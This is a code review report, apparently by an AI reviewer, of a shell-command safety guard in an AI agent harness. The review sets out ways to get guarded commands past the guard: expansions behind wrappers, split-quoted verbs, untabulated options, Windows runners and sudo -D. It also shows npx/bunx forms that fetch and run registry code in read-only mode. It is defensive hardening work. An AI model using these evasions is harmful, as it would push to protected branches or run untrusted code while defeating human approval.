---
phase: 12-openspec-opt-in-skill
reviewed: 2026-10-13T00:00:00Z
depth: deep
iteration: 2
files_reviewed: 24
files_reviewed_list:
  - .gitignore
  - .pi/extensions/harness/index.ts
  - .pi/extensions/safety/infra.ts
  - .pi/extensions/safety/shell.ts
  - .pi/extensions/safety/policy.ts
  - .pi/extensions/plan-mode/read-only.ts
  - docs/OPENSPEC.md
  - docs/RUNBOOK.md
  - docs/SAFETY.md
  - scripts/openspec-setup.sh
  - tests/fixtures/evasion-corpus.ts
  - tests/fixtures/openspec-skills.ts
  - tests/helpers/harness-session.ts
  - tests/integration/openspec-setup.test.ts
  - tests/integration/openspec-zero-cost.test.ts
  - tests/unit/docs-policy.test.ts
  - tests/unit/gitignore-policy.test.ts
  - tests/unit/infra-policy.test.ts
  - tests/unit/openspec-docs.test.ts
  - tests/unit/openspec-env.test.ts
  - tests/unit/openspec-skills.test.ts
  - tests/unit/policy-compose.test.ts
  - tests/unit/shell-deny-list.test.ts
  - tests/unit/shell-parse.test.ts
findings:
  critical: 3
  warning: 5
  info: 4
  total: 12
status: issues_found
---

# Phase 12: Code Review Report (re-review after fix iteration 1)

**Reviewed:** 2026-10-13
**Depth:** deep. Traced `policy.ts#evaluate`, `shell.ts#canonicalise`, `infra.ts` and `plan-mode/read-only.ts#classifyPlanModeCommand`. Every claim below was probed by running the real modules under Node 24 type stripping. Old behaviour was probed against copies of the `7666ad3` (pre-fix) sources. `tests/unit/shell-parse.test.ts` passes (46/46).
**Files Reviewed:** 24
**Status:** issues_found

## Summary

The prior findings are fixed as described:
- `env A=1`, `env --`, `sudo --`, `exec`, `timeout N`, `nice -n N`, `/usr/bin/env`, chained wrappers and the npx/bunx/`pnpm dlx`/`npm exec` forms all classify correctly.
- `context --code-workspace` confirms.
- The setup-script path check now handles relative, case-variant, `..` and `~` values.
- The env-restore and `.pi` porcelain tests now have real negative controls.

The new grammar still leaves three ways to defeat the guard:
1. Grammar-based resolution discards the "unresolved expansion in command position" rule. `g=git; env $g push origin main` is allowed, while `$g push origin main` is refused. The new wrappers (`exec`, `timeout`, `command`, `nice`, ...) widen this.
2. The new fail-closed "unresolved-wrapper" refusal keys on raw source text, but execution uses quote-resolved words. A split-quote verb behind any untabulated option runs: `env --ignore-signal=PIPE g''it push origin main` is allowed.
3. Making npx/bunx/`pnpm dlx`/`npm exec` into wrappers silently loosened plan mode, which reuses `canonicalise`. `npx -y @evil/ls@1.0.0` is now an allowed "read-only" command that downloads and runs registry code. Before the change it was denied.

Probe excerpt (facts: protected `main`; plan-mode column is `classifyPlanModeCommand`):

```
evaluate  plan   command
allow     -      g=git; env $g push origin main            (plain `$g push origin main` -> block)
allow     -      g=git; exec $g push origin main / timeout 5 $g ... / sudo $g ... / command $g ...
allow     -      env --ignore-signal=PIPE g''it push origin main
allow     -      sudo -P te''rraform apply
allow     -      npx --registry=https://r.example open''spec update
allow     allow  npx -y @evil/ls@1.0.0                     (at 7666ad3: plan deny "npx is not on ... allowlist")
allow     allow  npx -y @attacker/git@1 status / bunx grep x / pnpm dlx @x/head@1 a
allow     -      npm --yes exec openspec update / pnpm -C . dlx @fission-ai/openspec update
allow     -      sudo -D /other git commit -m x            (env -C /other git commit -m x -> block)
confirm   -      command -v openspec / command -v terraform
allow     -      cmd //c "git push origin main" / powershell -Command "git push origin main" / winpty git push origin main
block     -      ls openspec/changes | xargs -I{} cat openspec/changes/{}/proposal.md
```

## Structural Findings (fallow)

No structural pre-pass was provided.

## Narrative Findings (AI reviewer)

## Critical Issues

### CR-01: An unresolved expansion behind any wrapper resolves to `allow`, so the grammar does not classify "exactly as if typed plainly"

**File:** `.pi/extensions/safety/shell.ts:390-404` (rule) and `:633-637` (resolution), claim at `docs/SAFETY.md:41-47`
**Issue:** `hasUnresolvedExpansionInCommandPosition` only inspects `Command.name` and, when the name is literally a guarded verb, its suffix. After wrapper resolution, the real command position is `suffix[index-1]`, and nobody checks it for expansions. `resolveWrappers` treats `$g` as an ordinary non-option word and returns it as the executable. `classifyInfraInvocation` then returns `not-applicable`, and the git arm never runs.

Probed results:
- Allowed: `g=git; env $g push origin main`, `g=git; exec $g push origin main`, `g=git; timeout 5 $g push origin main`, `g=git; command $g push origin main`, `g=git; nohup $g push origin main`, `g=terraform; sudo $g apply`, `env "$TF" apply`.
- Refused as `unresolved-expansion-in-command-position`: the plain `g=git; $g push origin main`.

The `env`, `sudo` and `nohup` forms already existed at `7666ad3`. Commit 442a680 extended the hole to every new wrapper. The new SAFETY.md bullet ("the real executable is classified exactly as if it were typed plainly") and the module docstring ("policy sees `git push`, never `env` or `sudo`") are now false. No corpus row covers the shape.
**Fix:** Apply the command-position rule to the resolved word, not just `Command.name`:
```ts
// in extractInvocations, after resolveWrappers(values)
const words = [node.name, ...node.suffix];
const execWord = words[resolved.index];
if (hasExpansionPart(execWord)) refuse("unresolved-expansion-in-command-position");
if (isLiteralGuardedExecutable(execWord) && words.slice(resolved.index + 1).some(hasExpansionPart)) refuse(/* same cause */);
```
Plumb this through as a per-invocation flag, the way `confident` is plumbed, and refuse in `canonicalise`. Add BLOCKED corpus rows for `g=git; env $g push origin main` and `g=git; timeout 5 $g push origin main`.

### CR-02: The fail-closed `unresolved-wrapper` refusal tests raw text, so split quotes defeat it

**File:** `.pi/extensions/safety/shell.ts:691` (and docstring `:18-19`)
**Issue:** An unconfident resolution is refused only when `GUARDED_VERB_PATTERN.test(e.invocation.rawSegment)`. The raw slice of `g''it`, `te''rraform`, `\git` (the backslash form is caught) or `g""it` does not match `\bgit\b`, but bash executes `git`.

The trick needs only a real option that the per-wrapper table does not list. Plenty exist: GNU env `--ignore-signal`, `--default-signal`, `--block-signal`, `-a`; sudo `-P`, `-c`, `-r`, `-t`, `-B`; npx `--registry`, `-w`; ionice `-p`. Probed `allow` results:
- `env --ignore-signal=PIPE g''it push origin main` (Git for Windows' coreutils supports `--ignore-signal`)
- `sudo -P te''rraform apply`
- `npx --registry=https://r.example open''spec update`
- `env -a x g""it push origin main`

In each case the resolved executable is the leftover option word, which nothing classifies. This defeats the exact property the fix introduced ("an unconfident segment carrying a guarded verb is refused, never allowed"). The only negative control, `env --frobnicate git push`, uses an unquoted verb, so it cannot catch this.
**Fix:** Test the quote-resolved words too. Every `Word.value` from `resolved.index` onward is a candidate executable:
```ts
const tail = values.slice(resolved.index);
const mentionsGuarded = GUARDED_VERB_PATTERN.test(rawSegment) ||
	tail.some((w) => GUARDED_VERB_PATTERN.test(w) || /^(git|glab|terraform|aws|kubectl|openspec)$/.test(normaliseExecutable(w)));
```
To be stricter, refuse every unconfident resolution outright. Its only legitimate users are untabulated options, and those should become table rows. Add corpus rows with `g''it` and `te''rraform` behind an untabulated option.

### CR-03: Package-runner wrappers turned plan mode's read-only allowlist into "run any npm package named like an allowed verb"

**File:** `.pi/extensions/safety/shell.ts:216-218, 222-227, 264` and their consumer `.pi/extensions/plan-mode/read-only.ts:566-575`
**Issue:** `classifyPlanModeCommand` reuses `canonicalise` and allowlists `normaliseExecutable(invocation.executable)` without ever looking at `invocation.wrappers`. Commit 9218ddc made npx, pnpx, bunx, `npm exec|x`, `pnpm dlx|exec`, `yarn dlx|exec` and `bun x` resolve away, and added an `@version` strip to `normaliseExecutable`. As a result, plan mode now allows all of these:
- `npx -y @evil/ls@1.0.0`
- `npx -y cat README.md`
- `bunx grep x`
- `pnpm dlx @x/head@1 a`
- `npx -y @attacker/git@1 status` (classified as `git status`)

Each one downloads a registry package and executes its bin with full user permissions on the AWS-credentialed laptop. At `7666ad3` every one of them was denied ("`npx` is not on plan mode's read-only allowlist"). The fixer's adjacent-consumer run passed because no plan-mode test row uses a package runner. The `@` strip applies to every executable, not only package specs, so a local `./ls@x` script also reaches plan mode's `ls` rule.
**Fix:** Export the package-runner wrapper names from `shell.ts` and deny them in plan mode:
```ts
// shell.ts
export const PACKAGE_RUNNER_WRAPPERS = new Set(["npx", "pnpx", "bunx", "npm exec", "npm x", "pnpm dlx", "pnpm exec", "yarn dlx", "yarn exec", "bun x"]);
// read-only.ts, inside the invocation loop
if (invocation.wrappers.some((w) => PACKAGE_RUNNER_WRAPPERS.has(w))) {
	return { kind: "deny", reason: "a package runner executes registry code; plan mode is read-only" };
}
```
Apply the `@version` strip only when a package-runner wrapper was consumed, not in the shared `normaliseExecutable`. Add plan-mode test rows for `npx -y @evil/ls@1.0.0` and `bunx grep x`.

## Warnings

### WR-01: Package-manager options before the subcommand skip the two-word runner resolution, contradicting SAFETY.md

**File:** `.pi/extensions/safety/shell.ts:565-569`, `docs/SAFETY.md:193`
**Issue:** `PACKAGE_MANAGER_RUNNERS` only matches when the subcommand is the very next word. npm, pnpm and yarn accept global options first, so each of these resolves to executable `npm`/`pnpm`/`yarn` and is allowed with no prompt:
- `npm --yes exec openspec update`
- `npm -y x -- openspec init`
- `pnpm -C . dlx @fission-ai/openspec update`
- `yarn --cwd . dlx @fission-ai/openspec update`

SAFETY.md:193 states flatly that `npm exec`, `pnpm dlx|exec` and `yarn dlx|exec` "resolve to the package binary", and no OUT-OF-SCOPE row exists for these forms.
**Fix:** For these four managers, skip leading options with a small value table before looking up the subcommand:
- pnpm: `-C`/`--dir`, `--filter`/`-F`
- yarn: `--cwd`
- npm: `--prefix`, `-w`/`--workspace`

Mark resolution unconfident on any other leading option, so CR-02's refusal applies. Otherwise publish these forms as OUT-OF-SCOPE corpus rows and correct SAFETY.md:193 and OPENSPEC.md:59.

### WR-02: `sudo -D`/`--chdir` is consumed but never becomes `cwdOverride`, so the protected-branch oracle reads the wrong repo

**File:** `.pi/extensions/safety/shell.ts:575-579`
**Issue:** Only `env -C`/`--chdir` is recorded. Suppose cwd is on a feature branch and `/other` is on `main`:
- `env -C /other git commit -m x` blocks.
- `sudo -D /other git commit -m x`, `sudo --chdir=/other git commit -m x` and `sudo -D /other env git commit -m x` are allowed.

The grammar table lists `-D`/`--chdir` for sudo (line 130-131) precisely because it is a directory override, so this is an omission rather than a design choice. macOS is a stated target platform.
**Fix:**
```ts
if ((verb === "env" && (option === "-C" || option === "--chdir")) ||
    (verb === "sudo" && (option === "-D" || option === "--chdir"))) {
	cwdOverride = value;
}
```
Add a `policy-compose` row with `currentBranchFor` returning `main` only for `/other`.

### WR-03: `command -v`/`-V` is resolved as if it executes its operand: `command -v openspec` now needs approval

**File:** `.pi/extensions/safety/shell.ts:212`
**Issue:** The new grammar lists `-v`/`-V` as pass-through booleans. `command -v X` is the POSIX "is X installed" query and runs nothing, yet it resolves to executable `X` with no args:
- `command -v openspec` returns confirm ("openspec with no subcommand").
- `command -v terraform && terraform plan` returns confirm.
- `command -v git` blocks on a protected branch.

Adding `openspec` in this phase extends a pre-existing `git` false positive to the exact pre-flight check an agent runs before using the new skills. Every unnecessary prompt trains reflexive approval, which infra.ts's own docstring calls worse than no gate.
**Fix:** Give the grammar a `queryOptions` set (`-v`, `-V` for `command`). When one is seen, stop resolution with `index` pointing at `command` itself and `confident: true`, so the executable is `command`, which is unclassified and therefore allowed. Add rows: `command -v openspec` gives allow, `command openspec update` gives confirm.

### WR-04: Common runners and wrappers still pass guarded verbs unprompted and are absent from the OUT-OF-SCOPE table, notably the Windows ones

**File:** `.pi/extensions/safety/shell.ts:47-64, 177-219`, `docs/SAFETY.md:41-47, 172-191`
**Issue:** Each of these probes as `allow` on protected `main`:
- Windows: `cmd //c "git push origin main"`, `cmd.exe /c terraform apply`, `powershell -Command "git push origin main"`, `pwsh -c "terraform apply"`, `winpty git push origin main`. All of these exist on the primary platform, Windows Git Bash, and `winpty` is Git for Windows' standard TTY wrapper.
- Generic: `find . -exec git push origin main \;`, `su -c "git push origin main"`, `script -c "..."`, `flock /tmp/l git push origin main`, `parallel git push ::: origin`, `strace -f terraform apply`, `chroot / terraform apply`, `ssh localhost terraform apply`, `busybox ash -c '...'`, `ksh -c '...'`.

These are not regressions, but the new "Wrapper indirection" bullet implies general coverage. The corpus contract says every known gap is either BLOCKED or published, and these are neither.
**Fix:**
- Add `cmd`, `powershell`, `pwsh`, `ksh`, `ash`, `mksh`, `csh`, `tcsh`, `su`, `script`, `parallel` and `ssh` to `SHELL_RUNNERS`.
- Treat `find` as a runner when its args contain `-exec`, `-execdir`, `-ok` or `-okdir`.
- Add `winpty`, `flock` (1 operand), `strace` and `chroot` (1 operand) to `WRAPPER_GRAMMARS`.
- For whatever stays uncovered, add OUT-OF-SCOPE corpus rows so they reach the coupled SAFETY.md table.

### WR-05: `openspec` as a guarded verb hard-blocks ordinary runner use over the `openspec/` directory, beyond the documented side effect

**File:** `.pi/extensions/safety/shell.ts:44, 654-657`, `docs/SAFETY.md:193`, `docs/OPENSPEC.md:59`
**Issue:** The shell-runner rule substring-matches the raw segment, and the OpenSpec workspace directory is literally named `openspec`. Each of these is now a hard block, with no approval path:
- `ls openspec/changes | xargs -I{} cat openspec/changes/{}/proposal.md`
- `python3 tools/lint.py openspec/specs`
- any `node`/`python`/`xargs` invocation that names a path under `openspec/`

The docs mention only `sh scripts/openspec-setup.sh`. The unconfident-wrapper rule has the same raw-substring sensitivity: `npx -w packages/app vitest run tests/git-policy.test.ts` is refused because `-w` is untabulated and a path contains `git`.
**Fix:** For the runner check, ignore path-segment matches, for example `/\b(git|glab|terraform|aws|kubectl|openspec)\b(?![\/\\])/i`. `node /x/openspec/bin/openspec.js` still matches through `openspec.js`. Separately, add `-w`/`--workspace` and `--registry` to `PACKAGE_RUNNER_GRAMMAR.value`. If you keep the current behaviour, document the `openspec/`-path false positive in SAFETY.md and OPENSPEC.md next to the setup-script note.

## Info

### IN-01: Comments and docs now state guarantees the code does not provide, and one edited comment kept a history ID

**File:** `.pi/extensions/safety/shell.ts:2-3, 16-19`, `docs/SAFETY.md:42-47`, `.pi/extensions/plan-mode/read-only.ts:49-51`
**Issue:**
- The docstring says "an unconfident segment carrying a guarded verb is refused, never allowed" (false per CR-02) and "policy sees `git push`, never `env`" (false per CR-01). AGENTS.md: "a wrong comment is worse than none."
- `shell.ts:17` cites `shell-parse.test.ts` from production code, which is a caller reference.
- The read-only.ts comment was edited in 9218ddc but still opens with "CORRECTION TO THAT RESIDUAL (CR2-01)". AGENTS.md says to update a comment when editing it, and to put no review IDs in comments.

**Fix:** Correct the comments when CR-01 and CR-02 land, drop the test-file reference, and remove the CR2-01 header from the touched comment.

### IN-02: `env -` (POSIX spelling of `-i`) is refused in front of a guarded verb

**File:** `.pi/extensions/safety/shell.ts:510, 589`
**Issue:** `word === "-"` breaks out of the option loop, and the post-loop check then marks `-` in command position as unconfident. As a result `env - git status` is refused. This is fail-closed, but it is a false positive on a valid form.
**Fix:** In the env grammar, treat a lone `-` as the boolean `-i`.

### IN-03: An unpinned global install of the guarded CLI is unclassified

**File:** `.pi/extensions/safety/infra.ts:320-321` (rationale), `.pi/extensions/safety/shell.ts:222-227`
**Issue:** `openspec update` confirms partly because it "can offer an unpinned global self-upgrade". However, the agent can run `npm i -g @fission-ai/openspec@latest`, which does exactly that, and it is allowed without a prompt. That bypasses the 14-day age rule and the review that docs/OPENSPEC.md:63-64 require.
**Fix:** Either confirm on `npm|pnpm|yarn|bun (i|install|add) -g|--global` naming `@fission-ai/openspec`, or publish it as an OUT-OF-SCOPE row next to EV-39.

### IN-04: Previous-iteration Info items remain open

**File:** `scripts/openspec-setup.sh:58` (CDPATH in `SCRIPT_DIR`), `scripts/openspec-setup.sh:219` (INT/TERM trap does not exit), `scripts/openspec-setup.sh:265-271` (non-atomic install), `tests/unit/openspec-docs.test.ts` ("The Phase 12 section" comment, which violates AGENTS.md's no-phase-ID rule), `tests/helpers/faux.ts` (does not restore the four OpenSpec env variables)
**Issue:** The fixer marked these out of scope (IN-01..IN-06 in 12-REVIEW.iter2.md), so they are still present unchanged.
**Fix:** As described in the prior report. The cheapest are `CDPATH= cd` on line 58 and `trap 'exit 130' INT; trap 'exit 143' TERM`.

---

_Reviewed: 2026-10-13_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: deep_
